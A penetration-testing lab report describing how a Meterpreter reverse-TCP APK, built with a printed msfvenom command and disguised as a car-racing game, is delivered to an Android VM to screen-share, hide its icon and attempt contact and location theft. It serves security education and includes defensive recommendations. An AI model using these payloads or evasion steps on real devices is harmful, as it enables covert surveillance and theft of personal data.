# Android Penetration Testing Lab

## 1. Executive Summary

### Approach

This assessment focused on demonstrating how a malicious Android application could be created and used to gain access to an Android device in a controlled virtual lab environment. The assessment used Kali Linux as the attacker machine and an Android x86 virtual machine as the target.

The testing involved creating an Android Meterpreter reverse TCP payload, disguising it as a gaming application, hosting the APK on an Apache web server, and downloading it onto the Android VM. After the application was executed, a Meterpreter session was established between the Android VM and Kali Linux. Several Meterpreter commands were then tested to determine what access and monitoring capabilities were available.

During this assessment, I was able to not only download the malicious application through the internet, but also establish a connection to the target device. From there, I was able to test access to the device’s contacts, although no contacts were available, view the target device’s screen through screenshare, and hide the malicious application from the device. These results demonstrate how a seemingly harmless application could potentially give an attacker access to personal and sensitive information and allow them to monitor activity on the device.

Overall, this assessment demonstrated how easily a malicious application can create security risks when a user is convinced to download and run it. Although this was performed in a controlled environment, the results show how an attacker could potentially monitor a device and access sensitive information. For organizations, this highlights the importance of strong application security controls, user awareness, and limiting the permissions applications are given.

### Scope

The scope of this assessment was limited to the Android x86 virtual machine and the Kali Linux attacker machine used in the lab. The Android VM was used instead of a physical mobile device so that the testing could be performed in an isolated and controlled environment.

The assessment included:

- Creation and delivery of a malicious Android APK
- Establishment of a Meterpreter session
- Review of application permissions
- Testing of available Meterpreter commands
- Screen monitoring through `screenshare`
- Testing the ability to hide the application icon
- Attempted access to contact information
- Attempted wireless geolocation

No physical devices or external users were included in the assessment.

### Assessment Overview

The objective of this project was to generate and deploy a malicious APK using Metasploit to attack an Android device and understand the security risks this can pose. This was done using an Android x86 VM, which allowed us to test the software inside a virtual environment rather than on a physical phone or device.

The malicious APK was configured to look like a gaming app to lure the victim into downloading it. The goal was to see what data we could access from the target and how we could monitor their device. This was completed through a combination of social engineering and technical understanding, or lack thereof. By taking advantage of a victim's behaviors, attackers can target users in ways that may lead to successful exploitation.

Through this testing, I was able to establish a Meterpreter session, view the live device screen through screenshare, and hide the app icon on the phone to make the application less noticeable to the user. I also attempted to access the user's contacts, but no contacts were found. I additionally attempted to use `wlan_geolocate`, which is intended to determine a user's physical location by scanning nearby Wi-Fi networks, but I was not able to demonstrate successful geolocation during this lab.

## 2. Recommendations & Remediations

### Short-Term Recommendations

#### Review Application Permissions

When an application requests permissions that are broader than its expected functionality, users and developers should first understand why the app needs those privileges and clearly explain the benefits to the user. Any requests that are unnecessary should be denied. If extended privileges are required, it is important to implement in-context requests, such as "Only while using the app," rather than full unrestricted access whenever possible.

#### Avoid Untrusted APK Sources

Users should consider where an APK comes from before downloading and installing it. They should also review what permissions the application requires and what data it may access. Common permissions include location, camera, microphone, storage/photos/files, contacts, and network access.

Permissions can create security risks if an application is malicious or compromised. Users should also review privacy statements to understand how their data may be stored, shared, or sold. Unnecessary access to personal information can increase the risk of data leakage, identity theft, financial loss, and unwanted marketing.

### Medium-Term Recommendations

#### Strengthen Android Application Controls

During the assessment, Android security features initially blocked the application from being installed. In one instance, an option to continue the installation was available, while another attempt did not provide that option. The application was eventually installed after the Play Protect scanning feature was disabled.

This demonstrates the importance of keeping Android security features enabled. Additional safeguards around disabling or overriding security protections could provide another barrier against users intentionally or unintentionally installing potentially harmful applications.

#### Monitor Suspicious Application Behavior

Repeated failed downloads or installation attempts could be one indicator of unusual application activity, especially when combined with other warning signs. Organizations should consider monitoring for unusual application installation behavior and investigate activity that does not match normal user behavior.

### Long-Term Recommendations

#### Continue User Security Awareness Training

Users should receive ongoing training about the risks of downloading applications from untrusted sources. Training should cover how malicious applications can be disguised as legitimate software and why users should pay attention to application permissions and security warnings.

#### Maintain Mobile Security Controls

Organizations should maintain mobile security controls that prevent or limit the installation of applications from untrusted sources. Security policies should also discourage users from disabling built-in protections such as application scanning unless there is a legitimate and controlled reason to do so.

## 3. Technical Findings

### Methodology

The assessment was conducted within an isolated virtual lab environment consisting of a Kali Linux attacker machine and an Android x86 virtual machine acting as the target. The objective was to demonstrate how a malicious Android application could be used to establish a remote Meterpreter session and evaluate the level of access available after successful execution.

#### Tools Used

The following tools were used during the assessment:

- **Kali Linux** — Attacker operating system and testing environment
- **Metasploit Framework** — Used to create the Android payload and manage the Meterpreter session
- **msfvenom** — Used to generate the Android Meterpreter APK
- **Meterpreter** — Used to interact with the compromised Android VM and test available capabilities
- **Apache** — Used to host the APK so it could be downloaded by the Android VM
- **VirtualBox** — Used to run the Android x86 virtual machine
- **Android x86** — Target operating system used for the controlled lab
- **Web browser** — Used on the Android VM to access and download the hosted APK

#### 1. Lab Environment Setup

I started by setting up an Android x86 virtual machine in VirtualBox to use as my target. I used Kali Linux as the attacker machine. The Android VM was running Android 9, and I confirmed that Kali and the Android VM were on the same network. Kali had the IP address `10.0.2.5` and the Android VM had the IP address `10.0.2.8`.

<img width="1892" height="897" alt="image" src="https://github.com/user-attachments/assets/0392818a-5507-40f5-abc3-f0c99d808a75" />

<img width="1115" height="344" alt="image" src="https://github.com/user-attachments/assets/a5dbe1ff-2e77-497f-92c8-40b0aba2f943" />


#### 2. Setting Up the Tools

I used Metasploit Framework and Meterpreter for the lab. I also used Apache to host the APK file so that I could download it onto the Android VM.

I first checked that Metasploit was installed on Kali. The system showed that Metasploit Framework version 6.5.3 was already installed.

I then created a `games` folder in the Apache web directory and checked that the folder was available.

<img width="1869" height="831" alt="image" src="https://github.com/user-attachments/assets/35a1022e-2e1f-4651-a91f-3e2b1d77431b" />

<img width="1863" height="457" alt="image" src="https://github.com/user-attachments/assets/41399672-ab23-4514-9886-e022af227f64" />

<img width="409" height="246" alt="image" src="https://github.com/user-attachments/assets/d0cf8c65-b441-43d6-9048-b3dd356134e4" />

#### 3. Creating the APK

Next, I used `msfvenom` to create an Android Meterpreter reverse TCP payload. I configured it to connect back to my Kali machine at `10.0.2.5` using port `4444`.

The APK was named `car-race.apk` and was saved in the Apache web directory.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /var/www/html/games/car-race.apk
```

The generated APK was placed in the `games` directory so it could be accessed through the Apache web server.

<img width="1184" height="460" alt="image" src="https://github.com/user-attachments/assets/ea2d48ff-5382-48ac-8f54-df2203bd05c5" />


I did run into an issue with the APK during the first attempt, so I had to regenerate it before continuing with the lab.

#### 4. Downloading the APK

Once the APK was hosted, I opened the Android VM's browser and went to:

```
http://10.0.2.5/games/
```

This allowed me to download the APK onto the Android VM.

<img width="1020" height="765" alt="image" src="https://github.com/user-attachments/assets/b2ca3a90-6747-4101-9f9a-21ef53ac3ea2" />

Android's security features initially caused some issues with installing the application. After working through the installation issue, I was able to get the application running on the Android VM.

<img width="1018" height="766" alt="image" src="https://github.com/user-attachments/assets/1e4608e2-8872-42f2-80aa-51a5893555d2" />

The application appeared in the Android app drawer as `MainActivity`.

<img width="1023" height="768" alt="image" src="https://github.com/user-attachments/assets/ed3cb973-f4ca-4f64-b8ed-a42499f67187" />


#### 5. Reviewing Permissions

I also looked at the permissions requested by the application. The application requested access to several areas of the device, including contacts, call logs, SMS, location, the camera, microphone, phone calls, and system settings.

I included this as part of the lab because it showed how much access an application can potentially request from a device.

<img width="1030" height="771" alt="image" src="https://github.com/user-attachments/assets/a66a40fd-d81c-42e9-8a21-f61f4ea5382b" />


#### 6. Setting Up the Metasploit Handler

After creating and installing the APK, I set up a Metasploit `multi/handler` to wait for the Android device to connect back to Kali.

The handler was configured to listen on port `4444`.

<img width="876" height="767" alt="image" src="https://github.com/user-attachments/assets/c543ebd6-7bb0-4590-9f00-7e417368686f" />

<img width="883" height="397" alt="image" src="https://github.com/user-attachments/assets/aaae0738-cd1e-4be0-a40d-b32f07cd476a" />


#### 7. Establishing the Meterpreter Session

Once the application was running on the Android VM, it connected back to my Kali machine. This successfully opened a Meterpreter session.

The connection showed:

```text
Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.8:60106)
```

This confirmed that I had successfully established a Meterpreter connection between the Android VM and Kali.


#### 8. Gathering Information About the Android VM

After getting the session, I used the `sysinfo` command to see information about the Android device.

The results showed that the target was running Android 9 on an x86_64 system.

<img width="894" height="579" alt="image" src="https://github.com/user-attachments/assets/7774d35e-0dbe-42eb-bdf6-dc0246696d0c" />

I also looked through the Meterpreter help menu to see what commands were available for the Android target.

<img width="862" height="326" alt="image" src="https://github.com/user-attachments/assets/abb92a22-d80f-4c31-b88e-83ebeb9d7c13" />

#### 9. Testing Meterpreter Commands

I then tested a few of the available Meterpreter commands.

First, I tried `dump_contacts` to see if I could retrieve contact information from the Android VM. The command returned:

```text
No contacts were found!
```

<img width="893" height="578" alt="image" src="https://github.com/user-attachments/assets/5bfb2212-5829-4699-8e30-354694a468a1" />


I also tested the `screenshare` command. This was successful and allowed me to view the Android VM's screen through the Meterpreter session.

<img width="750" height="509" alt="image" src="https://github.com/user-attachments/assets/50fe0f15-feb7-46f9-8e00-e6ce66231e7b" />


Finally, I tested the ability to hide the application's icon. My first command was:

```text
hide_app_icon_MainActivity
```

This did not work and returned:

```text
Unknown command
```

<img width="880" height="257" alt="image" src="https://github.com/user-attachments/assets/72f3e5e8-122c-41ed-bee1-e7ecbc6190b8" />


I then corrected the command to:

```text
hide_app_icon MainActivity
```

This time, the command worked and returned:

```text
Activity MainActivity was hidden
```

<img width="491" height="84" alt="image" src="https://github.com/user-attachments/assets/3b49f3b1-dc4d-4fde-97d3-e88ad09ddd62" />


After running the command, `MainActivity` was no longer visible in the Android application drawer.

<img width="1022" height="773" alt="image" src="https://github.com/user-attachments/assets/2a99e62b-9562-4ac2-8715-258ac9b28409" />


#### 10. Documenting the Results

Throughout the lab, I took screenshots of the different steps and results. I documented both the things that worked and the things that did not work. This included the APK installation issues, the failed `hide_app_icon` command, the successful Meterpreter connection, and the Meterpreter commands I tested.

### Troubleshooting

Several issues occurred during the lab that required troubleshooting before testing could continue.

The first issue involved the APK itself. During the first attempt to create the APK, the file did not generate correctly, so I regenerated the payload before continuing.

The Android VM also initially blocked the application during installation because of Android's built-in security protections. I had to work through the installation issue before the application could be successfully run.

There was also an issue with the `hide_app_icon` command. My first attempt used:

```text
hide_app_icon_MainActivity
```

Meterpreter returned `Unknown command`. After checking the available commands and correcting the syntax, I used:

```text
hide_app_icon MainActivity
```

The corrected command successfully hid the application icon.

During the lab, the Kali terminal and Meterpreter session also appeared to become unresponsive at one point. I attempted several ways to regain control of the terminal before using the VirtualBox controls and Android console to reboot the environment. The lab later expired due to inactivity, so I resumed the environment and continued the testing until the required activities were completed.

### MITRE ATT&CK Mapping

The following MITRE ATT&CK techniques were identified based on activities that were actually demonstrated during this project.

| Technique | Name | How It Applied |
|---|---|---|
| [T1628.001](https://attack.mitre.org/techniques/T1628/001/) | Hide Artifacts: Suppress Application Icon | The application icon was successfully hidden from the Android app drawer. |
| [T1513](https://attack.mitre.org/techniques/T1513/) | Screen Capture | Meterpreter `screenshare` was successfully used to view the Android device screen. |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | The APK was disguised as a gaming application and relied on the user downloading and executing it. |
| [T1437.001](https://attack.mitre.org/techniques/T1437/001/) | Application Layer Protocol: Web Protocols | HTTP was used through Apache to host and deliver the APK to the Android VM. |


### Technical Findings

#### Finding 1 — Malicious APK Execution

**Description:**  
A malicious Android APK was created using `msfvenom` and configured to establish a reverse TCP connection back to the Kali Linux attacker machine.

**Evidence:**  
The payload was configured with Kali's IP address (`10.0.2.5`) and port `4444`. After the application was executed on the Android VM, a Meterpreter session was successfully opened.

**Result:**  
The successful Meterpreter connection demonstrated that a malicious application could provide remote access to the target when executed.

#### Finding 2 — Excessive Application Permissions

**Description:**  
The application requested permissions that provided access to multiple sensitive areas of the Android device.

**Evidence:**  
The permission screen showed requests involving contacts, call logs, SMS, location, camera, microphone, phone calls, and system settings.

**Result:**  
The permissions demonstrated how a malicious or overly privileged application could potentially gain access to sensitive device functionality if those permissions were granted.

#### Finding 3 — Screen Monitoring

**Description:**  
The Meterpreter `screenshare` command was used to view the Android device's screen remotely.

**Evidence:**  
The screenshare session successfully displayed the Android VM screen and showed the target's browser activity.

**Result:**  
This demonstrated that an attacker with an established Meterpreter session could monitor the target device's screen.

#### Finding 4 — Application Icon Hiding

**Description:**  
The Meterpreter session was used to hide the application's icon from the Android application drawer.

**Evidence:**  
The command `hide_app_icon MainActivity` returned `Activity MainActivity was hidden`, and the application was no longer visible in the app drawer.

**Result:**  
This demonstrated a method that could make a malicious application less noticeable to a device user.

#### Finding 5 — Contact Access Attempt

**Description:**  
The `dump_contacts` command was tested to determine whether contact information could be retrieved from the Android VM.

**Evidence:**  
The command returned:

```text
No contacts were found!
```

**Result:**  
Contact information was not successfully retrieved during this assessment.

#### Finding 6 — Wireless Geolocation Attempt

**Description:**  
The `wlan_geolocate` command was attempted to determine whether the target's physical location could be identified using nearby Wi-Fi networks.

**Evidence:**  
The command was attempted during the Meterpreter testing.

**Result:**  
Successful geolocation was not demonstrated during this lab.

# Appendices

## Appendix A — MITRE ATT&CK References

The following MITRE ATT&CK techniques were identified as relevant to activities demonstrated during the assessment.

| Technique | Name | How It Relates to the Lab |
|---|---|---|
| T1628.001 | Hide Artifacts: Suppress Application Icon | The application icon was successfully hidden from the Android app drawer. |
| T1513 | Screen Capture | Meterpreter `screenshare` was successfully used to view the Android device screen. |
| T1204.002 | User Execution: Malicious File | The APK was disguised as a gaming application and relied on the user downloading and executing it. |
| T1437.001 | Application Layer Protocol: Web Protocols | HTTP was used through Apache to host and deliver the APK to the Android VM. |

> **Note:** These techniques are included as references to help categorize activities demonstrated during the lab. They do not indicate that each technique represents a separate vulnerability.

---

## Appendix B — CVE References

The assessment did not directly exploit a specific CVE. The attack demonstrated in this lab relied on a malicious Android application, user execution, and Meterpreter functionality rather than exploiting a known vulnerability in Android itself.

Android 9 has publicly documented CVEs, but no specific CVE was directly tested or exploited during this assessment. Therefore, no CVE is being assigned to the findings in this report.
